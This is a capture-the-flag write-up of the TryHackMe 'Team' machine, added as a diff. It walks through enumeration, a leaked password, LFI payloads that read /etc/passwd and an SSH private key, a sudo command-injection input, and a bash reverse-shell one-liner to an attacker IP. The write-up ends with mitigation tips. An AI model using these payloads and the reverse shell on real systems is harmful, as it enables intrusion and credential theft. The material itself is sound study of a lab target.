@@ -1,0 +1,145 @@
+TryHackMe / CTF Writeup – Team Machine
+🖥️ Target Information
+Target IP: 10.49.164.188
+Difficulty: Medium (based on exploitation flow)
+Attack Vector: Web + LFI + Credential Reuse + Privilege Escalation
+📌 Reconnaissance
+🔍 Nmap Scan
+nmap -sC -sV -p- 10.49.164.188
+Results:
+21/tcp  open  ftp     vsftpd 3.0.5
+22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp  open  http    Apache 2.4.41
+Key Observations:
+FTP service available but anonymous login disabled
+Web server running Apache default page
+SSH accessible → possible later access vector
+🌐 Web Enumeration
+📂 Directory Fuzzing
+
+Using tools like:
+
+gobuster dir -u http://10.49.164.188 -w /usr/share/wordlists/dirb/common.txt
+Findings:
+/images
+/scripts
+/robots.txt
+robots.txt:
+dale
+
+➡️ Likely username discovered
+
+🌍 Subdomain Enumeration
+wfuzz -c -u http://team.thm -H "Host: FUZZ.team.thm" \
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 977
+Discovered:
+www.team.thm
+dev.team.thm
+
+➡️ dev.team.thm is important (dev environment = weak security)
+
+🔎 Further Enumeration on dev Subdomain
+Found:
+http://dev.team.thm/scripts/
+Fuzzing:
+/script.txt
+/script.old
+🔐 Credential Disclosure
+📄 script.old Contents:
+read -p "Enter Username: " ftpuser
+read -sp "Enter Username Password: " T3@m$h@r3
+
+➡️ Hardcoded credential discovered:
+
+Password: T3@m$h@r3
+📡 FTP Access
+
+Using credentials:
+
+ftp 10.49.164.188
+Retrieved File:
+New_site.txt
+Contents:
+Mentions:
+New site under .dev
+Users must store id_rsa in config
+
+➡️ Critical clue for SSH key exposure
+
+🚨 Local File Inclusion (LFI)
+Vulnerable Endpoint:
+http://dev.team.thm/script.php?page=
+Exploit Example:
+http://dev.team.thm/script.php?page=/etc/passwd
+Goal:
+
+Retrieve SSH private key
+
+Payload:
+http://dev.team.thm/script.php?page=/home/dale/.ssh/id_rsa
+
+➡️ Successfully obtained dale’s private key
+
+🔑 Initial Access
+SSH Login:
+chmod 600 id_rsa
+ssh -i id_rsa dale@10.49.164.188
+Access Gained:
+User: dale
+🧭 Privilege Escalation – Phase 1
+Check Sudo Permissions:
+sudo -l
+Output:
+(gyles) NOPASSWD: /home/gyles/admin_checks
+
+➡️ We can run script as gyles
+
+🧪 Exploiting admin_checks
+
+Run:
+
+sudo -u gyles /home/gyles/admin_checks
+Observation:
+Accepts user input
+Executes commands unsafely
+Injection:
+Enter 'date': id
+
+➡️ Command injection confirmed
+
+🧭 Privilege Escalation – Phase 2
+Find Writable Scripts
+find / -type f -group admin 2>/dev/null
+Found:
+/usr/local/bin/main_backup.sh
+🛠️ Exploit
+
+Append reverse shell:
+
+echo '/bin/bash -i >& /dev/tcp/<YOUR-IP>/1234 0>&1' >> /usr/local/bin/main_backup.sh
+🎧 Listener
+nc -lvnp 1234
+🚀 Trigger Exploit
+sudo -u gyles /home/gyles/admin_checks
+
+➡️ Reverse shell received
+
+👑 Root Access
+whoami
+root
+🧠 Key Takeaways
+🔴 Vulnerabilities Exploited:
+Sensitive info in backup scripts
+Subdomain exposure (dev)
+Local File Inclusion (LFI)
+SSH key exposure
+Weak sudo misconfiguration
+Writable script in privileged group
+Command injection
+🛡️ Mitigation Tips:
+Never store credentials in scripts
+Disable directory listing
+Sanitize user input
+Restrict file permissions
+Avoid exposing dev environments publicly
+Use least privilege principle
